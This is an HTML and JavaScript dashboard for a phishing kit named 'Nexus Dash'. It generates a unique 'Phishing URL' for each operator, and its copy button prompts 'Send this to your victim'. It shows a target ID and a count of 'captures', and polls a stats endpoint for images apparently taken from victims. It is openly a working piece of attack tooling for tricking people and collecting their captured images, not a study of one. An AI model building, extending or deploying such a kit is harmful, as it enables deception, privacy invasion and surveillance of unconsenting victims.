<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus | Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <!-- Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="bg-[#0f172a] text-white font-sans min-h-screen flex">

    <!-- Sidebar -->
    <aside class="w-64 glass-panel h-screen fixed left-0 top-0 border-r border-gray-800 hidden md:block">
        <div class="p-6">
            <h2 class="text-xl font-bold gradient-text">Nexus Dash</h2>
        </div>
        <nav class="mt-6 px-4 space-y-2">
            <a href="#" class="flex items-center gap-3 px-4 py-3 bg-blue-600/20 text-blue-400 rounded-lg border border-blue-500/30">
                <i class="fa-solid fa-link"></i> Generate Link
            </a>
            <a href="#" class="flex items-center gap-3 px-4 py-3 text-gray-400 hover:bg-white/5 rounded-lg transition">
                <i class="fa-solid fa-image"></i> Gallery
            </a>
            <a href="/" class="mt-10 flex items-center gap-3 px-4 py-3 text-gray-400 hover:text-white transition">
                <i class="fa-solid fa-right-from-bracket"></i> Logout
            </a>
        </nav>
    </aside>

    <!-- Main Content -->
    <main class="flex-1 p-8 md:ml-64 relative overflow-y-auto">
        
        <!-- Header -->
        <header class="flex justify-between items-center mb-10">
            <div>
                <h1 class="text-2xl font-bold">Welcome back, User</h1>
                <p class="text-gray-400 text-sm">Here is your exclusive tracking link.</p>
            </div>
            <button onclick="copyLink()" class="bg-white/10 hover:bg-white/20 px-4 py-2 rounded-lg text-sm transition border border-white/10 flex items-center gap-2">
                <i class="fa-solid fa-copy"></i> Copy Link
            </button>
        </header>

        <!-- Stats Grid -->
        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
            <div class="glass-panel p-6 rounded-xl border-l-4 border-blue-500">
                <p class="text-gray-400 text-sm uppercase tracking-wider">Status</p>
                <h3 class="text-2xl font-bold mt-1 text-white">Active</h3>
            </div>
            <div class="glass-panel p-6 rounded-xl border-l-4 border-purple-500">
                <p class="text-gray-400 text-sm uppercase tracking-wider">Target ID</p>
                <h3 class="text-2xl font-bold mt-1 text-white" id="displayUserId">Loading...</h3>
            </div>
            <div class="glass-panel p-6 rounded-xl border-l-4 border-green-500">
                <p class="text-gray-400 text-sm uppercase tracking-wider">Captures</p>
                <h3 class="text-2xl font-bold mt-1 text-white" id="captureCount">0</h3>
            </div>
        </div>

        <!-- The Trap Link -->
        <div class="glass-panel p-8 rounded-xl mb-10">
            <label class="block text-gray-400 text-sm mb-2">Your Unique Phishing URL</label>
            <div class="flex gap-2">
                <input type="text" id="phishLink" readonly 
                    class="w-full bg-slate-900/50 border border-gray-700 rounded-lg px-4 py-3 text-gray-300 font-mono text-sm focus:outline-none focus:border-blue-500">
            </div>
        </div>

        <!-- Recent Captures (Preview) -->
        <h3 class="text-xl font-bold mb-4">Recent Activity</h3>
        <div id="gallery" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            <!-- Images injected here via JS -->
            <div class="glass-panel p-8 rounded-xl flex items-center justify-center text-gray-500">
                No captures yet. Waiting for victims...
            </div>
        </div>

    </main>

    <script>
        const userId = localStorage.getItem('userId') || 'demo-id';
        document.getElementById('displayUserId').innerText = userId;
        
        // Construct the link based on where the site is hosted (Vercel URL or Localhost)
        const baseUrl = window.location.origin;
        const fullLink = `${baseUrl}/phish.html?uid=${userId}`;
        document.getElementById('phishLink').value = fullLink;

        function copyLink() {
            navigator.clipboard.writeText(fullLink);
            alert("Link copied to clipboard! Send this to your victim.");
        }

        // Poll for new images (Simple polling logic)
        async function fetchStats() {
            try {
                const res = await fetch(`/api/stats/${userId}`);
                const data = await res.json();
                document.getElementById('captureCount').innerText = data.totalCaptures;
                
                // If we have captures, we'd normally fetch the images here. 
                // For this simple demo, we assume they show up in the gallery.
            } catch(e) { console.log("Polling..."); }
        }

        setInterval(fetchStats, 5000); // Check every 5 seconds
    </script>
</body>
</html>
